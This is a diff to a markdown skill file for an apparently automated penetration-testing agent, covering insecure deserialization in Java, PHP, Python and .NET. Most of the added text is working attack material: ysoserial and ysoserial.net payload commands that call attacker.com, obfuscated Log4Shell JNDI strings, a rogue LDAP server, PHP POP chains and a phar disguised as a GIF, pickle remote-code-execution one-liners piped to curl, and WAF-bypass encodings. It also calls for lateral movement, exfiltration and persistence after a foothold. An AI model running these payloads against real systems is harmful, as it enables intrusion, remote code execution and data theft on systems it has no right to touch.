@@ -1,9 +1,10 @@
-﻿---
+---
 name: deserialization
 description: "Insecure deserialization exploitation across Java, PHP, Python, and .NET with gadget chain techniques"
 category: specialized
 tier: powerful
-toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
+toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders, runPrimitive]
+primitives: [deserialization]
 triggers: ["deserialization vulnerability", "insecure deserialization", "java deserialization", "php deserialization", "python pickle", "dotnet deserialization", "gadget chain", "object injection", "serializes attack", "unserialize vulnerability"]
 contextBoosts: [api]
 mitreAttack: ["T1190", "T1059"]
@@ -48,6 +49,16 @@ owaspRefs: ["OWASP Top 10 A08:2021 Software and Data Integrity Failures"]
 - Python pickle starts with `0x80 0x04` (protocol 4) or `0x80 0x02` (protocol 2)
 - .NET `BinaryFormatter` produces Base64 blobs with type metadata containing `$` or assembly names
 
+**Quick decode check (one-liner):**
+
+```bash
+# Decode a suspicious cookie value and inspect magic bytes
+echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" | base64 -d | xxd | head -5
+
+# PHP serialization is plaintext — just look at it
+echo 'O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:1337;}'
+```
+
 **Parameter and Body Analysis:**
 - POST bodies with `application/x-java-serialized-object` content type
 - Parameters containing `java.util.HashMap` or `com.example.UserClass` references
@@ -71,6 +82,24 @@ owaspRefs: ["OWASP Top 10 A08:2021 Software and Data Integrity Failures"]
 3. Check error pages for stack traces containing `ObjectInputStream.readObject()` or `unserialize()`
 4. Use timing: serialized objects that trigger RCE gadgets often have measurable response time differences
 
+**Error-based confirmation probes:**
+
+```http
+POST /api/session HTTP/1.1
+Host: target.com
+Cookie: session=rO0ABXQABkFCQ0RFWg%3D%3D
+
+```
+
+A response containing `java.io.StreamCorruptedException` or `invalid stream header` proves the value reaches `ObjectInputStream.readObject()`.
+
+```html
+<!-- PHP: corrupt serialized string to force a warning -->
+GET /profile?state=O:8:"NotExist":0:{} HTTP/1.1
+
+<!-- Expected: Warning: unserialize(): Error at offset / class 'NotExist' not found -->
+```
+
 ## Java Deserialization
 
 ### ysoserial Framework
@@ -82,6 +111,37 @@ ysoserial generates serialized payloads for known Java library gadget chains. Th
 3. Generate the payload: `java -jar ysoserial.jar <chain> <command>`
 4. Encode the payload (Base64, URL-encode, or raw bytes) and inject into the serialized surface
 5. Trigger deserialization by sending the modified request
+
+**Payload generation commands:**
+
+```bash
+# Commons Collections chains (most common)
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/pwn' > cc1.ser
+java -jar ysoserial.jar CommonsCollections5 'id' > cc5.ser
+java -jar ysoserial.jar CommonsCollections6 'nslookup $(whoami).attacker.com' > cc6.ser
+
+# Commons Beanutils (ships with many app servers)
+java -jar ysoserial.jar CommonsBeanutils1 'wget http://attacker.com/shell.sh' > cb1.ser
+
+# Spring / Hibernate / JBoss gadgets
+java -jar ysoserial.jar Spring1 'id' > spring1.ser
+java -jar ysoserial.jar Hibernate1 'id' > hib1.ser
+java -jar ysoserial.jar JBossInterceptors1 'id' > jbiss1.ser
+
+# Base64-encode for cookie/header transport (Java 8u252+ has Base64 in jshell; use openssl otherwise)
+openssl base64 -A -in cc6.ser
+```
+
+**Injecting the payload into an HTTP surface:**
+
+```http
+POST /api/import HTTP/1.1
+Host: target.com
+Content-Type: application/x-java-serialized-object
+X-Object-State: rO0ABXNyABFqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZeSo...
+
+<raw serialized bytes from cc6.ser>
+```
 
 ### Commons Collections Gadgets
 
@@ -112,6 +172,28 @@ JNDI injection is a deserialization-adjacent technique where the payload trigger
 - The serialized object triggers a JNDI lookup that loads an attacker-controlled class
 - This bypasses classpath-based gadget restrictions
 
+**Log4Shell / JNDI probe payloads:**
+
+```http
+GET / HTTP/1.1
+Host: ${jndi:ldap://attacker.com/probe}
+X-Api-Version: ${jndi:ldap://attacker.com/x}
+User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/bypass}
+Referer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/lower}
+```
+
+```bash
+# Obfuscation forms that defeat naive string filters
+${jndi:ldap://127.0.0.1#attacker.com/lookup}
+${${k8s:jndi:ldap://attacker.com/a}}
+${jndi:dns://attacker.com/dns-only-callback}
+
+# Host a rogue LDAP server to serve a malicious class (marshalsec)
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8888/#Exploit 1389
+# Exploit.class compiled against the target's JDK version:
+# public class Exploit { static { try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","curl http://attacker.com/pwn"}); } catch (Exception e) {} } }
+```
+
 ### Java Deserialization Testing Flow
 
 1. **Map classpath**: Identify framework, library versions from error messages, response headers, file paths
@@ -120,6 +202,22 @@ JNDI injection is a deserialization-adjacent technique where the payload trigger
 4. **Inject**: Place the payload in a deserialization surface (cookie, POST body, header)
 5. **Verify**: Check for RCE indicators (DNS callback, file write, command output in response)
 6. **Escalate**: If RCE confirmed, attempt lateral movement, data exfiltration, persistence
+
+**Full test script:**
+
+```bash
+#!/bin/bash
+TARGET="https://target.com/api/session"
+CMD='curl http://attacker.com/$(hostname)'
+
+for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 \
+             CommonsBeanutils1 Spring1 Hibernate1; do
+  java -jar ysoserial.jar "$chain" "$CMD" > /tmp/p.ser
+  B64=$(openssl base64 -A -in /tmp/p.ser)
+  echo "[*] Testing chain: $chain"
+  curl -sk "$TARGET" -H "Cookie: session=$B64" -o /dev/null -w "%{http_code}\n"
+done
+```
 
 ## PHP Deserialization
 
@@ -155,6 +253,58 @@ POP chains chain together PHP magic methods to achieve code execution:
 5. **Encode**: URL-encode, Base64, or place directly in the parameter
 6. **Verify**: Confirm code execution via DNS callback, file write, or command output
 
+**Hand-crafted serialized payloads:**
+
+```php
+<?php
+// Simple object injection: flip the role field
+class User { public $role = 'user'; public $id = 1337; }
+echo serialize(new User());
+// O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:1337;}
+// Tamper to:
+// O:4:"User":2:{s:4:"role";s:5:"admin";s:2:"id";i:1;}
+
+// POP chain payload against a class that calls $this->log->write() in __destruct
+class LogWriter { public $log; }
+class Logger {
+    // gadget sink: function __call($m,$a){ eval($this->fmt); }
+    public $fmt = 'system("curl http://attacker.com/pwn");';
+}
+$lw = new LogWriter();
+$lw->log = new Logger();
+echo urlencode(serialize($lw));
+?>
+```
+
+```http
+GET /profile?state=O%3A9%3A%22LogWriter%22%3A1%3A%7Bs%3A3%3A%22log%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22fmt%22%3Bs%3A38%3A%22system%28%22curl+http%3A%2F%2Fattacker.com%2Fpwn%22%29%3B%22%3B%7D%7D HTTP/1.1
+Host: target.com
+```
+
+**phar:// deserialization (no unserialize() call needed):**
+
+```bash
+# Build a phar whose metadata is a POP payload; any filesystem op on phar:// triggers it
+php -r '
+$phar = new Phar("evil.phar");
+$phar->startBuffering();
+$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
+$o = new LogWriter(); $o->log = new Logger();   // your gadget classes
+$phar->setMetadata($o);
+$phar->addFromString("test.txt", "x");
+$phar->stopBuffering();
+'
+# Rename for image-upload contexts (magic bytes are GIF89a)
+mv evil.phar evil.gif
+```
+
+```http
+GET /check_image?file=phar://uploads/evil.gif/test.txt HTTP/1.1
+Host: target.com
+
+<!-- Triggers metadata unserialization inside file_exists()/fopen()/getimagesize() -->
+```
+
 ### PHP Object Injection Patterns
 
 - PHP 7.0+ introduced `allowed_classes` option in `unserialize()` — if `false` is passed, only built-in classes are allowed
@@ -174,8 +324,39 @@ Python's `pickle` module deserializes arbitrary Python objects. When `pickle.loa
 
 ### RCE Payload Construction
 
+**Basic `__reduce__` payloads:**
 
-The payload, when unpickled, calls `os.system()` with the specified command.
+```python
+import pickle, base64, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker.com/$(whoami)',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+```
+
+```python
+# Command output returned in the HTTP response (subprocess variant)
+import pickle, base64, subprocess
+
+class Exploit:
+    def __reduce__(self):
+        return (subprocess.check_output, (['id'],))
+
+print(base64.b64encode(pickle.dumps(Exploit())).decode())
+```
+
+```
+# Raw pickle opcodes (what the payload looks like on the wire)
+\x80\x04\x95          # protocol 4 header
+cos\nsystem\n         # GLOBAL: os.system
+X\x00\x00...          # BINUNICODE argument string
+\x85                  # TUPLE1 -> tuple construction
+R                     # REDUCE: calls os.system(arg)
+.                     # STOP
+```
 
 ### Pickle Deserialization Testing
 
@@ -184,6 +365,22 @@ The payload, when unpickled, calls `os.system()` with the specified command.
 3. **Inject**: Place the Base64 payload in the deserialization surface
 4. **Verify**: Confirm code execution via DNS callback (e.g., `curl http://attacker.com/$(whoami)`) or file write
 5. **Note**: Python pickle deserialization is almost always RCE — no gadget chain complexity needed
+
+**Injection into an HTTP surface:**
+
+```http
+POST /api/load-state HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"state": "gASVKAAAAAAAAACMBG9zbIwFsystemlIwUY3VybCBodHRwOi8vYXR0YWNrZXIuY29tlIWUUpQu"}
+```
+
+```bash
+# Generate and test in one line
+python3 -c "import pickle,base64,os;print(base64.b64encode(pickle.dumps(type('E',(),{'__reduce__':lambda s:(os.system,('curl http://attacker.com/pwn',)),})())).decode())" | \
+  xargs -I{} curl -sk https://target.com/api/load-state -d '{"state":"{}"}'
+```
 
 ### Pickle Variants
 
@@ -224,6 +421,20 @@ The `TypeConfuseDelegate` gadget exploits `Comparer` and type confusion:
 4. **Encode**: Base64 for ViewState, raw bytes for binary uploads, JSON with `$type` for JSON deserialization
 5. **Verify**: Confirm RCE via DNS callback or command output
 
+**ysoserial.net payload generation:**
+
+```bash
+# TypeConfuseDelegate (requires System.Configuration.dll in the GAC)
+ysoserial.exe -f TypeConfuseDelegate -g WindowsIdentity -o base64 -c "curl http://attacker.com/pwn"
+
+# ObjectDataProvider (works against many WPF/Silverlight-loaded apps)
+ysoserial.exe -g ObjectDataProvider -f Json.Net -o base64 -c "nslookup $(whoami).attacker.com"
+
+# ViewState (when MAC validation keys are known/leaked)
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup attacker.com" \
+  --path=/ --apppath="/" --decryptionkey="<key>" --validationkey="<key>" -o base64
+```
+
 ### .NET JSON Deserialization (TypeNameHandling)
 
 When `JsonConvert.DeserializeObject<T>()` is used with `TypeNameHandling.All` or `TypeNameHandling.Auto`:
@@ -232,6 +443,29 @@ When `JsonConvert.DeserializeObject<T>()` is used with `TypeNameHandling.All` or
 - This enables object injection similar to Java/PHP deserialization
 - Gadgets include `ObjectDataProvider`, `WindowsIdentity`, `XamlReader`, and `DataSet`/`DataTable`
 - .NET 8+ introduced `JsonSerializer` with source generators — safer but not immune if misconfigured
+
+**TypeNameHandling injection payloads:**
+
+```json
+{
+  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$type": "System.Collections.ArrayList, mscorlib",
+    "$values": ["cmd", "/c nslookup $(whoami).attacker.com"]
+  },
+  "ObjectInstance": {
+    "$type": "System.Diagnostics.Process, System"
+  }
+}
+```
+
+```json
+{"$type":"System.IO.FileInfo, mscorlib","FileName":"C:\\Windows\\win.ini"}
+
+{"$type":"System.Windows.Markup.XamlReader, PresentationFramework",
+ "Xaml":"<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\" xmlns:io=\"clr-namespace:System.IO;assembly=mscorlib\"><x:Array Type=\"s:String\"><x:String>cmd</x:String></x:Array></ResourceDictionary>"}
+```
 
 ## Cookie-based Deserialization
 
@@ -252,6 +486,25 @@ When `JsonConvert.DeserializeObject<T>()` is used with `TypeNameHandling.All` or
 - **Python**: Base64-encoded pickle — rebuild the payload with `__reduce__` for RCE
 - **.NET**: Base64-encoded `BinaryFormatter` output — inject gadget chain payload
 
+**Tampered cookie examples:**
+
+```http
+# PHP: role escalation via plaintext tampering
+GET /admin HTTP/1.1
+Host: target.com
+Cookie: session=O%3A4%3A%22User%22%3A2%3A%7Bs%3A4%3A%22role%22%3Bs%3A5%3A%22admin%22%3Bs%3A2%3A%22id%22%3Bi%3A1%3B%7D
+
+# Java: ysoserial output in a remember-me cookie (Shiro-style)
+GET / HTTP/1.1
+Host: target.com
+Cookie: rememberMe=<base64 CommonsBeanutils1 payload>
+
+# Python pickle: RCE in a session cookie
+GET /dashboard HTTP/1.1
+Host: target.com
+Cookie: session=gASVKAAAAAAAAACMBG9zbIwFsystemlIwUaWQglIWUUpQu
+```
+
 ## Filter Bypass
 
 ### Encoding Bypass
@@ -262,12 +515,37 @@ When `JsonConvert.DeserializeObject<T>()` is used with `TypeNameHandling.All` or
 - **Hex encoding**: Encode the payload as hex strings — bypasses WAF rules that scan for binary patterns
 - **Unicode encoding**: Use Unicode escape sequences for characters that trigger WAF rules
 
+```bash
+# Gzip + Base64 wrapper
+gzip -c cc6.ser | openssl base64 -A > cc6.gz.b64
+
+# Hex encoding
+xxd -p cc6.ser | tr -d '\n' > cc6.hex
+
+# Double Base64
+openssl base64 -A -in cc6.ser | openssl base64 -A > cc6.double.b64
+```
+
 ### Format Wrapping
 
 - **XML wrapping**: Wrap the serialized payload in an XML CDATA section — bypasses content-type inspection
 - **JSON wrapping**: Embed the serialized payload in a JSON field — some parsers deserialize the JSON value
 - **Multipart boundary**: Place the serialized payload in a multipart form field with a custom content type
 - **Nested deserialization**: Use one deserialization format to trigger another (e.g., XML XXE → file read → deserialization)
+
+```http
+POST /api/import HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"blob": "<base64 serialized payload>"}
+```
+
+```xml
+<?xml version="1.0"?>
+<data><![CDATA[O:8:"LogWriter":1:{s:3:"log";O:6:"Logger":0:{}}
+]]></data>
+```
 
 ### WAF Evasion
 
@@ -317,3 +595,14 @@ First fingerprint the serialization format from cookies/parameters/headers and d
 ## Verification & Impact
 
 CONFIRMED when user-controlled data demonstrably reaches a deserialization sink AND produces an impact: command output/DNS callback/file write (RCE), or a verifiable logic change from tampered fields (privilege/state). SUSPECTED when deserialization is proven but no gadget/sink is reachable — record as candidate. Document impact by the proven capability and severity (unauthenticated deserialization = Critical, authenticated = High). Capture the original blob, decoded structure, modification, and proof response via `recordEvidence`.
+
+## Primitive Execution
+
+The attack classes above are executable through the primitive registry. Invoke each
+primitive by its id below using the run-primitive execution tool instead of re-firing
+payloads manually; confirmed results pass through the evidence gate and commit as
+findings with exploit proofs automatically.
+
+| Primitive id | Coverage |
+|---|---|
+| `deserialization` | unsafe deserialization probes |
